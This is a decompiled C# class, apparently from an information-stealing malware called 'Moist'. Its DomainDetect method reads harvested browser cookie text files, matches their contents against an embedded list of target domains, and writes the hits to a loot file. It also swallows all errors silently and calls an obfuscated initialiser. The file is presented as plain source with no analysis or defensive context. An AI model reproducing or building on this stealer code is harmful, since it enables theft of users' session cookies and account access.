using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using Moist.Properties;

namespace Moist
{
	// Token: 0x02000023 RID: 35
	public class DomainDetect
	{
		// Token: 0x060000B1 RID: 177 RVA: 0x0000A624 File Offset: 0x00008824
		public static void Start(string Browser)
		{
			try
			{
				Encoding utf = Encoding.UTF8;
				List<string> list = (from w in Resources.smethod_0().Split(new char[0])
				select w.Trim() into w
				where w != ""
				select w.ToLower()).ToList<string>();
				DirectoryInfo directoryInfo = new DirectoryInfo(Help.Cookies);
				FileInfo[] files = directoryInfo.GetFiles("*.txt", SearchOption.AllDirectories);
				List<string> list2 = new List<string>();
				foreach (FileInfo fileInfo in files)
				{
					list2.AddRange(File.ReadAllLines(fileInfo.FullName, utf));
					Console.WriteLine(fileInfo.FullName);
				}
				HashSet<string> hashSet = new HashSet<string>();
				foreach (string text in list2)
				{
					List<string> list3 = (from w in text.Split(new char[0])
					select w.Trim() into w
					where w != ""
					select w.ToLower()).ToList<string>();
					foreach (string item in list3)
					{
						if (!hashSet.Contains(item))
						{
							hashSet.Add(item);
						}
					}
				}
				HashSet<string> hashSet2 = new HashSet<string>();
				foreach (string text2 in list)
				{
					foreach (string text3 in hashSet)
					{
						if (text3.Contains(text2) && !hashSet2.Contains(text2))
						{
							hashSet2.Add(text2);
						}
					}
				}
				File.WriteAllLines(Browser + "\\DomainDetect.txt", hashSet2, Encoding.Default);
				string.Join(", ", hashSet2);
			}
			catch
			{
			}
		}

		// Token: 0x060000B2 RID: 178 RVA: 0x0000446C File Offset: 0x0000266C
		public DomainDetect()
		{
			Class40.gcO0h7LzslQIW();
			base..ctor();
		}
	}
}
